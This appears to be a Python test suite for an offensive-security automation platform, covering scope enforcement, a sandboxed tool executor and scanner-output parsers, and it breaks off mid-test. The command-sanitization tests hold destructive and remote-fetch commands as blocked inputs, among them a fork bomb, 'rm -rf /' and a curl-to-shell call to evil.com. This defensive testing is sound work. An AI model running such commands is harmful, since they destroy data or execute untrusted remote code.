"""
Comprehensive test suite for the Arsenal offensive security platform.

Covers:
  - models.py: Enums, ScopeRule, Scope (signing/validation), Target, Evidence,
               ToolResult, Finding, Mission (audit log, stats)
  - config.py: ArsenalConfig defaults + from_env()
  - scope.py: ScopeEnforcer (allow/deny/CIDR/wildcard/URL/port, command extraction,
              integrity check, time-bound validation)
  - executor.py: ToolExecutor (sanitization, scope enforcement, dry-run, safe-mode,
                 tool registration, evidence capture)
  - tools.py: All 10 parsers (nmap XML/text, nuclei JSONL, subfinder, httpx, dig,
              whois, nikto, whatweb, ffuf, testssl), finding generators

Run:  python -m pytest cookbook/tests/test_arsenal.py -v
  or: python cookbook/tests/test_arsenal.py
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import sys
import time
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

# Ensure project root is on path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from cookbook.arsenal.models import (
    Severity, FindingCategory, MissionPhase, MissionStatus,
    EvidenceType, ToolCategory, ScopeAction,
    ScopeRule, Scope, Target, Evidence, ToolResult, Finding, Mission,
)
from cookbook.arsenal.config import ArsenalConfig
from cookbook.arsenal.scope import ScopeEnforcer, ScopeViolation
from cookbook.arsenal.executor import ToolExecutor, ToolSpec, BLOCKED_PATTERNS
from cookbook.arsenal.tools import (
    parse_nmap_xml, parse_nmap_text, parse_nuclei_jsonl,
    parse_subfinder_text, parse_httpx_jsonl, parse_dig, parse_whois,
    parse_nikto, parse_whatweb, parse_ffuf_json, parse_testssl,
    findings_from_nuclei, findings_from_nmap,
)


# ═══════════════════════════════════════════════════════════════════
# models.py tests
# ═══════════════════════════════════════════════════════════════════


class TestEnums(unittest.TestCase):
    """Verify all enum values are strings and accessible."""

    def test_severity_values(self):
        self.assertEqual(Severity.CRITICAL.value, "critical")
        self.assertEqual(Severity.HIGH.value, "high")
        self.assertEqual(Severity.MEDIUM.value, "medium")
        self.assertEqual(Severity.LOW.value, "low")
        self.assertEqual(Severity.INFO.value, "info")

    def test_severity_is_str(self):
        self.assertIsInstance(Severity.CRITICAL, str)
        self.assertEqual(Severity.CRITICAL.value, "critical")

    def test_finding_category_values(self):
        self.assertEqual(FindingCategory.INJECTION.value, "injection")
        self.assertEqual(FindingCategory.RCE.value, "remote_code_execution")
        self.assertEqual(FindingCategory.XSS.value, "cross_site_scripting")
        self.assertEqual(FindingCategory.MISCONFIG.value, "security_misconfiguration")

    def test_mission_phase_kill_chain_order(self):
        phases = list(MissionPhase)
        names = [p.value for p in phases]
        self.assertIn("scope_validation", names)
        self.assertIn("reconnaissance", names)
        self.assertIn("vulnerability_analysis", names)
        self.assertIn("reporting", names)

    def test_mission_status_values(self):
        self.assertEqual(MissionStatus.PENDING.value, "pending")
        self.assertEqual(MissionStatus.RUNNING.value, "running")
        self.assertEqual(MissionStatus.COMPLETED.value, "completed")
        self.assertEqual(MissionStatus.ABORTED.value, "aborted")

    def test_tool_category_values(self):
        cats = {c.value for c in ToolCategory}
        self.assertIn("reconnaissance", cats)
        self.assertIn("scanning", cats)
        self.assertIn("vulnerability", cats)


class TestScopeRule(unittest.TestCase):
    """ScopeRule matching logic."""

    def test_ip_exact_match(self):
        rule = ScopeRule(ScopeAction.ALLOW, "ip", "10.0.0.1")
        self.assertTrue(rule.matches("10.0.0.1", "ip"))
        self.assertFalse(rule.matches("10.0.0.2", "ip"))

    def test_ip_does_not_match_wrong_type(self):
        rule = ScopeRule(ScopeAction.ALLOW, "ip", "10.0.0.1")
        self.assertFalse(rule.matches("10.0.0.1", "domain"))

    def test_cidr_ipv4_match(self):
        rule = ScopeRule(ScopeAction.ALLOW, "cidr", "10.0.0.0/24")
        self.assertTrue(rule.matches("10.0.0.50", "cidr"))
        self.assertTrue(rule.matches("10.0.0.255", "cidr"))
        self.assertFalse(rule.matches("10.0.1.1", "cidr"))

    def test_cidr_invalid_input(self):
        rule = ScopeRule(ScopeAction.ALLOW, "cidr", "10.0.0.0/24")
        self.assertFalse(rule.matches("not-an-ip", "cidr"))

    def test_domain_exact_match(self):
        rule = ScopeRule(ScopeAction.ALLOW, "domain", "example.com")
        self.assertTrue(rule.matches("example.com", "domain"))
        self.assertFalse(rule.matches("evil.com", "domain"))

    def test_domain_wildcard(self):
        rule = ScopeRule(ScopeAction.ALLOW, "domain", "*.example.com")
        self.assertTrue(rule.matches("sub.example.com", "domain"))
        self.assertTrue(rule.matches("deep.sub.example.com", "domain"))
        self.assertTrue(rule.matches("example.com", "domain"))
        self.assertFalse(rule.matches("evil.com", "domain"))

    def test_port_exact(self):
        rule = ScopeRule(ScopeAction.ALLOW, "port", "443")
        self.assertTrue(rule.matches("443", "port"))
        self.assertFalse(rule.matches("80", "port"))

    def test_port_range(self):
        rule = ScopeRule(ScopeAction.ALLOW, "port", "1-1024")
        self.assertTrue(rule.matches("80", "port"))
        self.assertTrue(rule.matches("443", "port"))
        self.assertTrue(rule.matches("1", "port"))
        self.assertTrue(rule.matches("1024", "port"))
        self.assertFalse(rule.matches("8080", "port"))

    def test_deny_rule(self):
        rule = ScopeRule(ScopeAction.DENY, "ip", "10.0.0.99")
        self.assertTrue(rule.matches("10.0.0.99", "ip"))
        # matches() returns True (means the rule applies), action is DENY


class TestScope(unittest.TestCase):
    """Scope validation, signing, and serialization."""

    def _make_scope(self, valid=True):
        scope = Scope(
            rules=[
                ScopeRule(ScopeAction.ALLOW, "domain", "*.example.com"),
                ScopeRule(ScopeAction.ALLOW, "cidr", "10.0.0.0/24"),
                ScopeRule(ScopeAction.DENY, "ip", "10.0.0.99"),
            ],
            authorized_by="tester",
            authorization_ref="TEST-001",
        )
        if valid:
            scope.valid_from = time.time() - 3600
            scope.valid_until = time.time() + 3600
        return scope

    def test_check_domain_allowed(self):
        scope = self._make_scope()
        self.assertTrue(scope.check("sub.example.com", "domain"))

    def test_check_domain_denied(self):
        scope = self._make_scope()
        self.assertFalse(scope.check("evil.com", "domain"))

    def test_check_cidr_allowed(self):
        scope = self._make_scope()
        self.assertTrue(scope.check("10.0.0.50", "cidr"))

    def test_check_cidr_denied(self):
        scope = self._make_scope()
        self.assertFalse(scope.check("192.168.1.1", "cidr"))

    def test_default_deny(self):
        scope = self._make_scope()
        self.assertFalse(scope.check("unknown-target.io", "domain"))

    def test_deny_rule_overrides_allow(self):
        """Rules evaluated in order; first match wins."""
        scope = Scope(
            rules=[
                ScopeRule(ScopeAction.DENY, "ip", "10.0.0.5"),
                ScopeRule(ScopeAction.ALLOW, "cidr", "10.0.0.0/24"),
            ],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        self.assertFalse(scope.check("10.0.0.5", "ip"))
        self.assertTrue(scope.check("10.0.0.6", "cidr"))

    def test_expired_scope_denies_everything(self):
        scope = self._make_scope()
        scope.valid_until = time.time() - 1  # expired
        self.assertFalse(scope.check("sub.example.com", "domain"))

    def test_future_scope_denies_everything(self):
        scope = self._make_scope()
        scope.valid_from = time.time() + 9999
        scope.valid_until = time.time() + 99999
        self.assertFalse(scope.check("sub.example.com", "domain"))

    def test_sign_produces_hash(self):
        scope = self._make_scope()
        h = scope.sign()
        self.assertEqual(len(h), 64)  # SHA-256 hex
        self.assertEqual(h, scope.signature_hash)

    def test_sign_is_deterministic(self):
        s1 = self._make_scope()
        s2 = self._make_scope()
        self.assertEqual(s1.sign(), s2.sign())

    def test_sign_changes_with_rules(self):
        s1 = self._make_scope()
        s2 = self._make_scope()
        s2.rules.append(ScopeRule(ScopeAction.ALLOW, "ip", "1.2.3.4"))
        self.assertNotEqual(s1.sign(), s2.sign())

    def test_to_dict_from_dict_roundtrip(self):
        scope = self._make_scope()
        scope.sign()
        d = scope.to_dict()
        restored = Scope.from_dict(d)
        self.assertEqual(len(restored.rules), len(scope.rules))
        self.assertEqual(restored.authorized_by, "tester")
        self.assertEqual(restored.authorization_ref, "TEST-001")
        self.assertEqual(restored.signature_hash, scope.signature_hash)

    def test_empty_scope_denies_all(self):
        scope = Scope(valid_from=time.time() - 3600, valid_until=time.time() + 3600)
        self.assertFalse(scope.check("anything", "ip"))
        self.assertFalse(scope.check("anything", "domain"))


class TestTarget(unittest.TestCase):

    def test_label_with_hostname(self):
        t = Target(host="10.0.0.1", hostnames=["web.example.com"])
        self.assertEqual(t.label, "web.example.com (10.0.0.1)")

    def test_label_without_hostname(self):
        t = Target(host="10.0.0.1")
        self.assertEqual(t.label, "10.0.0.1")

    def test_ports_and_services(self):
        t = Target(host="10.0.0.1", ports=[22, 80], services={22: "SSH", 80: "Apache"})
        self.assertEqual(len(t.ports), 2)
        self.assertEqual(t.services[80], "Apache")


class TestEvidence(unittest.TestCase):

    def test_compute_hash(self):
        e = Evidence(raw_output="test data")
        h = e.compute_hash()
        expected = hashlib.sha256(b"test data").hexdigest()
        self.assertEqual(h, expected)
        self.assertEqual(e.sha256, expected)

    def test_unique_ids(self):
        e1 = Evidence()
        e2 = Evidence()
        self.assertNotEqual(e1.evidence_id, e2.evidence_id)

    def test_to_dict(self):
        e = Evidence(
            evidence_type=EvidenceType.TOOL_OUTPUT,
            tool_name="nmap",
            command="nmap -sV 10.0.0.1",
            raw_output="PORT STATE SERVICE",
            target="10.0.0.1",
        )
        e.compute_hash()
        d = e.to_dict()
        self.assertEqual(d["tool"], "nmap")
        self.assertEqual(d["target"], "10.0.0.1")
        self.assertEqual(d["raw_output_length"], len("PORT STATE SERVICE"))
        self.assertTrue(d["sha256"])


class TestToolResult(unittest.TestCase):

    def test_output_prefers_stdout(self):
        r = ToolResult(tool_name="test", command="test", stdout="out", stderr="err")
        self.assertEqual(r.output, "out")

    def test_output_falls_back_to_stderr(self):
        r = ToolResult(tool_name="test", command="test", stderr="err")
        self.assertEqual(r.output, "err")


class TestFinding(unittest.TestCase):

    def test_defaults(self):
        f = Finding(title="Test Finding")
        self.assertEqual(f.severity, Severity.INFO)
        self.assertEqual(f.category, FindingCategory.OTHER)
        self.assertEqual(f.cvss_score, 0.0)
        self.assertFalse(f.false_positive)
        self.assertFalse(f.verified)

    def test_to_dict(self):
        f = Finding(
            title="SQL Injection",
            severity=Severity.CRITICAL,
            category=FindingCategory.INJECTION,
            cvss_score=9.8,
            cve_ids=["CVE-2023-1234"],
        )
        d = f.to_dict()
        self.assertEqual(d["title"], "SQL Injection")
        self.assertEqual(d["severity"], "critical")
        self.assertEqual(d["category"], "injection")
        self.assertEqual(d["cvss_score"], 9.8)
        self.assertIn("CVE-2023-1234", d["cve_ids"])

    def test_unique_ids(self):
        f1 = Finding(title="A")
        f2 = Finding(title="B")
        self.assertNotEqual(f1.finding_id, f2.finding_id)


class TestMission(unittest.TestCase):

    def test_defaults(self):
        m = Mission(name="Test Mission")
        self.assertEqual(m.status, MissionStatus.PENDING)
        self.assertEqual(m.phase, MissionPhase.SCOPE_VALIDATION)
        self.assertEqual(m.findings, [])
        self.assertEqual(m.evidence, [])

    def test_log_appends(self):
        m = Mission()
        m.log("test_action", "detail text")
        self.assertEqual(len(m.audit_log), 1)
        self.assertEqual(m.audit_log[0]["action"], "test_action")
        self.assertEqual(m.audit_log[0]["detail"], "detail text")

    def test_add_evidence_computes_hash(self):
        m = Mission()
        e = Evidence(tool_name="nmap", raw_output="some output")
        eid = m.add_evidence(e)
        self.assertTrue(e.sha256)
        self.assertEqual(len(m.evidence), 1)
        self.assertEqual(m.evidence[0].evidence_id, eid)
        # Check audit log was updated
        self.assertTrue(any("evidence_added" in entry["action"] for entry in m.audit_log))

    def test_add_finding(self):
        m = Mission()
        f = Finding(title="XSS", severity=Severity.HIGH)
        fid = m.add_finding(f)
        self.assertEqual(len(m.findings), 1)
        self.assertEqual(m.findings[0].finding_id, fid)
        self.assertTrue(any("finding_added" in entry["action"] for entry in m.audit_log))

    def test_stats(self):
        m = Mission()
        m.add_finding(Finding(title="A", severity=Severity.CRITICAL))
        m.add_finding(Finding(title="B", severity=Severity.HIGH))
        m.add_finding(Finding(title="C", severity=Severity.HIGH))
        m.add_finding(Finding(title="D", severity=Severity.INFO))
        m.add_finding(Finding(title="FP", severity=Severity.CRITICAL, false_positive=True))
        stats = m.stats
        self.assertEqual(stats["critical"], 1)  # one FP excluded
        self.assertEqual(stats["high"], 2)
        self.assertEqual(stats["info"], 1)

    def test_duration_running(self):
        m = Mission()
        m.started_at = time.time() - 10
        # Not finished yet, should be ~10s
        self.assertGreater(m.duration, 9.0)
        self.assertLess(m.duration, 12.0)

    def test_duration_completed(self):
        m = Mission()
        m.started_at = 1000.0
        m.finished_at = 1042.0
        self.assertEqual(m.duration, 42.0)

    def test_to_dict(self):
        m = Mission(name="Test", operator="admin")
        m.add_finding(Finding(title="SQLi", severity=Severity.CRITICAL))
        d = m.to_dict()
        self.assertEqual(d["name"], "Test")
        self.assertEqual(d["operator"], "admin")
        self.assertEqual(len(d["findings"]), 1)
        self.assertIn("stats", d)
        self.assertIn("audit_log", d)


# ═══════════════════════════════════════════════════════════════════
# config.py tests
# ═══════════════════════════════════════════════════════════════════


class TestArsenalConfig(unittest.TestCase):

    def test_defaults(self):
        c = ArsenalConfig()
        self.assertEqual(c.api_base, "http://localhost:8000/v1")
        self.assertTrue(c.safe_mode)
        self.assertFalse(c.dry_run)
        self.assertTrue(c.require_scope_approval)
        self.assertTrue(c.use_docker)
        self.assertEqual(c.temperature, 0.3)
        self.assertEqual(c.max_tokens, 4096)
        self.assertEqual(c.tool_timeout, 300.0)
        self.assertEqual(c.mission_timeout, 3600.0)
        self.assertEqual(c.max_exploitation_depth, 1)
        self.assertEqual(c.scan_rate_limit, 100)

    def test_from_env(self):
        env = {
            "ARSENAL_API_BASE": "http://test:9999/v1",
            "ARSENAL_DRY_RUN": "true",
            "ARSENAL_SAFE_MODE": "false",
            "ARSENAL_MAX_TOKENS": "8192",
            "ARSENAL_TEMPERATURE": "0.1",
            "ARSENAL_USE_DOCKER": "false",
            "ARSENAL_SCAN_RATE_LIMIT": "50",
            "ARSENAL_VERBOSE": "true",
        }
        with patch.dict(os.environ, env, clear=False):
            c = ArsenalConfig.from_env()
            self.assertEqual(c.api_base, "http://test:9999/v1")
            self.assertTrue(c.dry_run)
            self.assertFalse(c.safe_mode)
            self.assertEqual(c.max_tokens, 8192)
            self.assertEqual(c.temperature, 0.1)
            self.assertFalse(c.use_docker)
            self.assertEqual(c.scan_rate_limit, 50)
            self.assertTrue(c.verbose)

    def test_evidence_dir_default(self):
        c = ArsenalConfig()
        edir = c.get_evidence_dir()
        self.assertTrue(str(edir).endswith("evidence"))

    def test_evidence_dir_custom(self):
        c = ArsenalConfig(evidence_dir="/tmp/my_evidence")
        self.assertEqual(str(c.get_evidence_dir()), "/tmp/my_evidence")


# ═══════════════════════════════════════════════════════════════════
# scope.py tests
# ═══════════════════════════════════════════════════════════════════


class TestScopeEnforcer(unittest.TestCase):

    def _make_mission(self):
        scope = Scope(
            rules=[
                ScopeRule(ScopeAction.ALLOW, "domain", "*.example.com"),
                ScopeRule(ScopeAction.ALLOW, "cidr", "10.0.0.0/24"),
                ScopeRule(ScopeAction.ALLOW, "port", "1-65535"),
                ScopeRule(ScopeAction.DENY, "ip", "10.0.0.99"),
            ],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        scope.sign()
        return Mission(name="Test", scope=scope)

    def test_allow_in_scope_domain(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertTrue(enforcer.check_target("sub.example.com", "test"))

    def test_deny_out_of_scope_domain(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertFalse(enforcer.check_target("evil.com", "test"))

    def test_allow_cidr_ip(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertTrue(enforcer.check_target("10.0.0.50", "test"))

    def test_deny_out_of_range_ip(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertFalse(enforcer.check_target("192.168.1.1", "test"))

    def test_enforce_raises_on_violation(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        with self.assertRaises(ScopeViolation):
            enforcer.enforce("evil.com", "test")

    def test_enforce_passes_on_allowed(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        enforcer.enforce("sub.example.com", "test")  # should not raise

    def test_url_target_extracts_host(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertTrue(enforcer.check_target("https://sub.example.com/path", "test"))
        self.assertFalse(enforcer.check_target("https://evil.com/path", "test"))

    def test_stats_tracking(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        enforcer.check_target("sub.example.com", "test")  # allowed
        enforcer.check_target("evil.com", "test")          # denied
        enforcer.check_target("10.0.0.1", "test")          # allowed
        stats = enforcer.stats
        self.assertEqual(stats["total_checks"], 3)
        self.assertEqual(stats["allowed"], 2)
        self.assertEqual(stats["denied"], 1)

    def test_check_command_extracts_ips(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        violations = enforcer.check_command("nmap -sV 10.0.0.1")
        self.assertEqual(violations, [])

    def test_check_command_catches_violations(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        violations = enforcer.check_command("nmap -sV 192.168.1.1")
        self.assertIn("192.168.1.1", violations)

    def test_check_command_extracts_urls(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        violations = enforcer.check_command(
            "curl https://evil.com/api/test"
        )
        self.assertTrue(len(violations) > 0)

    def test_enforce_command_raises_on_violation(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        with self.assertRaises(ScopeViolation):
            enforcer.enforce_command("nmap 192.168.1.1")

    def test_scope_integrity_valid(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertTrue(enforcer.validate_scope_integrity())

    def test_scope_integrity_tampered(self):
        mission = self._make_mission()
        mission.scope.rules.append(
            ScopeRule(ScopeAction.ALLOW, "ip", "1.2.3.4")
        )
        # Hash is now stale
        enforcer = ScopeEnforcer(mission)
        self.assertFalse(enforcer.validate_scope_integrity())

    def test_scope_integrity_unsigned_passes(self):
        mission = self._make_mission()
        mission.scope.signature_hash = ""  # no signature
        enforcer = ScopeEnforcer(mission)
        self.assertTrue(enforcer.validate_scope_integrity())

    def test_expired_scope_raises(self):
        mission = self._make_mission()
        mission.scope.valid_until = time.time() - 1
        enforcer = ScopeEnforcer(mission)
        with self.assertRaises(ScopeViolation):
            enforcer.check_target("sub.example.com", "test")

    def test_detect_type_ip(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertEqual(enforcer._detect_type("10.0.0.1"), "ip")
        self.assertEqual(enforcer._detect_type("192.168.1.1"), "ip")

    def test_detect_type_cidr(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertEqual(enforcer._detect_type("10.0.0.0/24"), "cidr")

    def test_detect_type_domain(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertEqual(enforcer._detect_type("example.com"), "domain")
        self.assertEqual(enforcer._detect_type("sub.example.com"), "domain")

    def test_detect_type_url(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertEqual(enforcer._detect_type("https://example.com"), "url")
        self.assertEqual(enforcer._detect_type("http://10.0.0.1"), "url")

    def test_detect_type_port(self):
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        self.assertEqual(enforcer._detect_type("443"), "port")
        self.assertEqual(enforcer._detect_type("8080"), "port")

    def test_audit_log_entries(self):
        """Scope checks should be recorded in the mission audit log."""
        mission = self._make_mission()
        enforcer = ScopeEnforcer(mission)
        enforcer.check_target("sub.example.com", "test")
        enforcer.check_target("evil.com", "test")

        log_actions = [e["action"] for e in mission.audit_log]
        self.assertIn("scope_allowed", log_actions)
        self.assertIn("scope_denied", log_actions)


# ═══════════════════════════════════════════════════════════════════
# executor.py tests
# ═══════════════════════════════════════════════════════════════════


class TestToolExecutor(unittest.TestCase):

    def _make_executor(self, **config_kw):
        config_kw.setdefault("use_docker", False)
        config_kw.setdefault("dry_run", True)
        config = ArsenalConfig(**config_kw)
        scope = Scope(
            rules=[
                ScopeRule(ScopeAction.ALLOW, "domain", "*.example.com"),
                ScopeRule(ScopeAction.ALLOW, "cidr", "10.0.0.0/24"),
            ],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        scope.sign()
        mission = Mission(name="Test", scope=scope)
        enforcer = ScopeEnforcer(mission)
        executor = ToolExecutor(config, mission, enforcer)
        return executor, mission

    def test_register_tool(self):
        executor, _ = self._make_executor()
        spec = ToolSpec("test_tool", ToolCategory.RECON, "echo",
                        description="Test tool", safe=True)
        executor.register_tool(spec)
        self.assertIsNotNone(executor.get_tool("test_tool"))

    def test_register_tool_unavailable(self):
        executor, _ = self._make_executor()
        spec = ToolSpec("fake_tool", ToolCategory.RECON, "binary_that_does_not_exist_xyz",
                        safe=True)
        executor.register_tool(spec)
        self.assertFalse(executor.get_tool("fake_tool").available)

    def test_list_tools_filters_by_category(self):
        executor, _ = self._make_executor()
        executor.register_tool(ToolSpec("nmap", ToolCategory.SCAN, "nmap", safe=True))
        executor.register_tool(ToolSpec("subfinder", ToolCategory.RECON, "subfinder", safe=True))
        # When using docker=False, tools may not be available unless binary exists
        # Force availability for test
        for t in executor._tools.values():
            t.available = True
        recon = executor.list_tools(ToolCategory.RECON)
        self.assertTrue(all(t.category == ToolCategory.RECON for t in recon))

    def test_execute_unknown_tool(self):
        executor, _ = self._make_executor()
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("nonexistent", [], target="10.0.0.1")
        )
        loop.close()
        self.assertFalse(result.success)
        self.assertIn("Unknown tool", result.error)

    def test_execute_unavailable_tool(self):
        executor, _ = self._make_executor()
        spec = ToolSpec("broken", ToolCategory.RECON, "nonexistent_bin", safe=True)
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("broken", [], target="10.0.0.1")
        )
        loop.close()
        self.assertFalse(result.success)
        self.assertIn("not available", result.error)

    def test_safe_mode_blocks_unsafe_tools(self):
        executor, _ = self._make_executor(safe_mode=True)
        spec = ToolSpec("exploit", ToolCategory.EXPLOIT, "msfconsole",
                        safe=False)
        spec.available = True
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("exploit", ["-x", "run"], target="10.0.0.1")
        )
        loop.close()
        self.assertFalse(result.success)
        self.assertIn("safe_mode", result.error)

    def test_dry_run_returns_planned_command(self):
        executor, _ = self._make_executor(dry_run=True)
        spec = ToolSpec("echo_tool", ToolCategory.UTIL, "echo", safe=True)
        spec.available = True
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("echo_tool", ["hello"], target="10.0.0.1")
        )
        loop.close()
        self.assertTrue(result.success)
        self.assertIn("[DRY RUN]", result.stdout)
        self.assertIn("echo", result.stdout)

    def test_scope_enforcement_blocks_out_of_scope(self):
        executor, _ = self._make_executor()
        spec = ToolSpec("nmap", ToolCategory.SCAN, "nmap", safe=True)
        spec.available = True
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("nmap", ["-sV", "192.168.1.1"], target="192.168.1.1")
        )
        loop.close()
        self.assertFalse(result.success)
        self.assertIn("SCOPE VIOLATION", result.error)

    def test_command_sanitization_blocks_fork_bomb(self):
        executor, mission = self._make_executor()
        violation = executor._sanitize_command(":(){:|:&};:")
        self.assertIsNotNone(violation)
        self.assertIn("Blocked pattern", violation)

    def test_command_sanitization_blocks_rm_rf(self):
        executor, _ = self._make_executor()
        violation = executor._sanitize_command("rm -rf /")
        self.assertIsNotNone(violation)

    def test_command_sanitization_blocks_pipe_to_shell(self):
        executor, _ = self._make_executor()
        violation = executor._sanitize_command("$(curl http://evil.com/script.sh)")
        self.assertIsNotNone(violation)

    def test_command_sanitization_allows_normal_commands(self):
        executor, _ = self._make_executor()
        violation = executor._sanitize_command("nmap -sV -p 1-1000 10.0.0.1")
        self.assertIsNone(violation)

    def test_safe_env_strips_secrets(self):
        executor, _ = self._make_executor()
        with patch.dict(os.environ, {
            "PATH": "/usr/bin",
            "HOME": "/home/test",
            "AWS_SECRET_KEY": "secret123",
            "GITHUB_TOKEN": "ghp_fake",
            "MY_PASSWORD": "hunter2",
        }, clear=False):
            env = executor._safe_env()
            self.assertIn("PATH", env)
            self.assertIn("HOME", env)
            self.assertNotIn("AWS_SECRET_KEY", env)
            self.assertNotIn("GITHUB_TOKEN", env)
            self.assertNotIn("MY_PASSWORD", env)

    def test_stats(self):
        executor, _ = self._make_executor()
        executor.register_tool(
            ToolSpec("t1", ToolCategory.RECON, "echo", safe=True)
        )
        stats = executor.stats
        self.assertEqual(stats["total_executions"], 0)
        self.assertIn("registered_tools", stats)
        self.assertIn("scope_stats", stats)


class TestToolExecutorExecution(unittest.TestCase):
    """Tests that actually execute commands (local, no Docker)."""

    def _make_executor(self, **kw):
        kw.setdefault("use_docker", False)
        kw.setdefault("dry_run", False)
        kw.setdefault("save_raw_output", False)
        config = ArsenalConfig(**kw)
        scope = Scope(
            rules=[
                ScopeRule(ScopeAction.ALLOW, "domain", "*.example.com"),
                ScopeRule(ScopeAction.ALLOW, "cidr", "10.0.0.0/24"),
                ScopeRule(ScopeAction.ALLOW, "ip", "127.0.0.1"),
            ],
            valid_from=time.time() - 3600,
            valid_until=time.time() + 3600,
        )
        scope.sign()
        mission = Mission(name="Test", scope=scope)
        enforcer = ScopeEnforcer(mission)
        return ToolExecutor(config, mission, enforcer), mission

    def test_execute_echo(self):
        """Actually run `echo` and verify output capture."""
        executor, mission = self._make_executor()
        spec = ToolSpec("echo_test", ToolCategory.UTIL, "echo", safe=True,
                        default_args=[])
        spec.available = True
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("echo_test", ["hello", "world"], target="127.0.0.1")
        )
        loop.close()
        self.assertTrue(result.success)
        self.assertIn("hello world", result.stdout)
        self.assertIsNotNone(result.evidence)
        self.assertTrue(result.evidence.sha256)

    def test_evidence_is_hashed(self):
        """Evidence SHA-256 matches raw output."""
        executor, mission = self._make_executor()
        spec = ToolSpec("echo_test", ToolCategory.UTIL, "echo", safe=True)
        spec.available = True
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("echo_test", ["forensic-test"], target="127.0.0.1")
        )
        loop.close()
        expected = hashlib.sha256(result.evidence.raw_output.encode()).hexdigest()
        self.assertEqual(result.evidence.sha256, expected)

    def test_execute_records_audit_log(self):
        """Execution should produce audit log entries."""
        executor, mission = self._make_executor()
        spec = ToolSpec("echo_test", ToolCategory.UTIL, "echo", safe=True)
        spec.available = True
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        loop.run_until_complete(
            executor.execute("echo_test", ["audit-test"], target="127.0.0.1")
        )
        loop.close()
        actions = [e["action"] for e in mission.audit_log]
        self.assertIn("tool_executing", actions)
        self.assertIn("tool_completed", actions)
        self.assertIn("evidence_added", actions)

    def test_parser_is_called(self):
        """Output parser should be invoked on success."""
        def fake_parser(output):
            return {"parsed": True, "length": len(output)}

        executor, mission = self._make_executor()
        spec = ToolSpec("echo_test", ToolCategory.UTIL, "echo", safe=True,
                        parse_fn=fake_parser)
        spec.available = True
        executor.register_tool(spec)
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(
            executor.execute("echo_test", ["parse-test"], target="127.0.0.1")
        )
        loop.close()
        self.assertTrue(result.parsed.get("parsed"))
        self.assertGreater(result.parsed.get("length", 0), 0)


# ═══════════════════════════════════════════════════════════════════
# tools.py parser tests
# ═══════════════════════════════════════════════════════════════════


class TestNmapXmlParser(unittest.TestCase):

    NMAP_XML = """<?xml version="1.0"?>
<nmaprun scanner="nmap" args="nmap -sV -oX - 10.0.0.1">
<scaninfo type="syn" protocol="tcp" numservices="1000" services="1-1000"/>
<host>
  <status state="up" reason="conn-refused"/>
  <address addr="10.0.0.1" addrtype="ipv4"/>
  <hostnames><hostname name="web.example.com" type="PTR"/></hostnames>
  <ports>
    <port protocol="tcp" portid="22">
      <state state="open" reason="syn-ack"/>
      <service name="ssh" product="OpenSSH" version="8.9p1" extrainfo="Ubuntu"/>
    </port>
    <port protocol="tcp" portid="80">
      <state state="open" reason="syn-ack"/>
      <service name="http" product="nginx" version="1.18.0"/>
    </port>
    <port protocol="tcp" portid="443">
      <state state="closed" reason="conn-refused"/>
      <service name="https"/>
    </port>
  </ports>
  <os>
    <osmatch name="Linux 5.x" accuracy="95"/>
    <osmatch name="Linux 4.x" accuracy="90"/>
  </os>
</host>
</nmaprun>"""

    def test_parses_hosts(self):
        result = parse_nmap_xml(self.NMAP_XML)
        self.assertEqual(len(result["hosts"]), 1)

    def test_parses_address(self):
        result = parse_nmap_xml(self.NMAP_XML)
        host = result["hosts"][0]
        self.assertEqual(host["addresses"][0]["addr"], "10.0.0.1")

    def test_parses_hostname(self):
        result = parse_nmap_xml(self.NMAP_XML)
        host = result["hosts"][0]
        self.assertIn("web.example.com", host["hostnames"])

    def test_parses_ports(self):
        result = parse_nmap_xml(self.NMAP_XML)
        ports = result["hosts"][0]["ports"]
        self.assertEqual(len(ports), 3)

    def test_port_details(self):
        result = parse_nmap_xml(self.NMAP_XML)
        ssh = result["hosts"][0]["ports"][0]
        self.assertEqual(ssh["port"], 22)
        self.assertEqual(ssh["state"], "open")
        self.assertEqual(ssh["service"], "ssh")
        self.assertEqual(ssh["product"], "OpenSSH")
        self.assertEqual(ssh["version"], "8.9p1")

    def test_parses_os(self):
        result = parse_nmap_xml(self.NMAP_XML)
